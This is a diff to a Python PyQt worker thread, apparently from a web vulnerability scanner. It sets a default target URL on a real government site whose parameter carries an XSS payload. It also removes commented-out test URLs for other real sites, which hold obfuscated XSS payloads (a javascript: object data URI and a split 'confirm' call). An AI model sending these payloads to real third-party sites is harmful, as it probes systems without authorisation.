@@ -75,10 +75,6 @@ class Worker(QThread):
         url_data.targeturl = myWin.input_url.text()
         if url_data.targeturl=="":
             url_data.targeturl = "http://www.shmsa.gov.cn/searchxxgk.jspx(POST)release=atestu&startDate=2018-11-23&title=atestu&endDate=2018-11-23&contentno=\"%20onclick=zpiqoy`6634`%20var=%20"
-        # url_data.targeturl = "http://www.jzchina.gov.cn/newthirds.aspx?dname=591&modulename=%2525u93c0%2525u57ae%2525u59df%2525u934f%2525ue100%2525u7d11"
-
-        # targeturl = "http://www.hebeizy.com.cn/ycplatform/hcomp/exWebSite/cms/cmsApp(POST)_TIMESTAMP=1500552979927&pageSize=&pageNo=&jspUrl=&classIds=ICd7a83f151139ed5f91f1c,111&WEB_PART_ID=A9B48317461F6882755A62F3DB1B97EB&COMPONENT_METHOD=queryAccessCmsPageContentWwmh&PAGE_ID=\"'\"></a><object+data=jav\x61scr\x69pt:wryvwb(6590)>&WEB_PART_INST_ID=1448419998869"
-        # targeturl ="https://jfdh.qlbchina.com/jfymall-client/goods/searchgoods.do(POST)serachType2=aaaa';window[`conf`+`irm`]`1`//&searchvalue=%E5%85%B3%E9%94%AE%E5%AD%97 "
         print("Target URL".center(160), "\n", url_data.targeturl)
         human_read.Dividing_line()
         begin = CheckPrepare()
